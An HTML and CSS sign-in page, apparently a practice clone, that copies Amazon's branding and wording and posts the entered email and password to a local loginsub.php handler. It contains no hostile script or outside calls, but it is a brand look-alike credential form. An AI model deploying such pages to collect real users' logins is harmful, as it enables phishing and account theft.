<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login form</title>
    <style>
        .loginform {
            background-color: white;
            height: 350px;
            width: 300px;
            padding: 35px;
            display: flex;
            margin: auto;
            margin-top: 15px;
            align-items: center;
            justify-content: center;
            border-radius: 10px;
            border: 1px solid rgb(231, 236, 238);

        }

        a {
            text-decoration: none;
        }

        a:hover {
            color: rgb(125, 58, 58);
            text-decoration: underline;
        }

        legend {
            margin: auto;
            width: 150px;
            margin-bottom: 10px;
            font-weight: 0.1rem;

        }

        .new-user p {
            background-color: transparent;
            background-color: white;
            padding: 10px;
            padding-left: 80px;
            width: 270px;
            margin: auto;
            display: flex;
            border: none;
            align-items: center;
            border-radius: 10px;
            border: 2px solid rgb(231, 236, 238);

        }

        .input-mail label {
            display: block;
        }

        .mail {
            width: 95%;
            padding: 5px;
            color: brown;
            margin-top: 2px;
            margin-bottom: 2px;
            border-radius: 5px;
            align-items: center;
            border: 1px solid black;
        }

        .mail:focus {
            border: 2px solid yellow;

            box-shadow: 50px blue;

        }

        .submit {
            background-color: rgb(255, 204, 0);
            width: 100%;
            margin-top: 5px;
            margin-bottom: 15px;
            border: none;
            padding: 8px;

            border-radius: 10px;
        }

        h1 {
            left: 0;
            font-weight: 200;

        }

        .logo-img {
            display: flex;
            justify-content: space-evenly;
            align-items: center;
        }

        .logo-img img {
            width: 115px;
        }

        #ltext {
            font-weight: 900;
            font-size: 1rem;
        }

        .stl {
            font-size: 0.8rem;
        }
    </style>
</head>

<body>
    <div class="logo-img">
        <img src="th.jpg">
    </div>
    <div class="loginform">


        <form method="POST" action="loginsub.php">
            <h1>Sign in</h1>
            <div class="input-mail">
                <label id="ltext">Email or mobile phone number</label>
                <input type="email" class="mail" required name="email">
            </div>
            <div class="password"> <label>Password</label> <input type="password" class="in-pwd" name="pwd" required> </div>
            <input type="submit" class="submit" name="Continue" value="Continue">
            <div class="other">
                <label>
                    <p class="stl">By continuing, you agree to Amazon's<a href="#"> Conditions of Use</a> and <a
                            href="#">Privacy Notice.
                        </a></p>
                </label>
            </div>
            <br><br>
            <label><a href="#">Need help?</a> </label>
            <br><br>
            <span>buying for work</span>
            <p><a href="#">Shop on Amazon Business</a></p>

        </form>
    </div>
    <br>
    <legend>New to Amazon?</legend>

    <div class="new-user">
        <p><a href="registration.php">Create your amazon account</a></p>
    </div>
</body>

</html>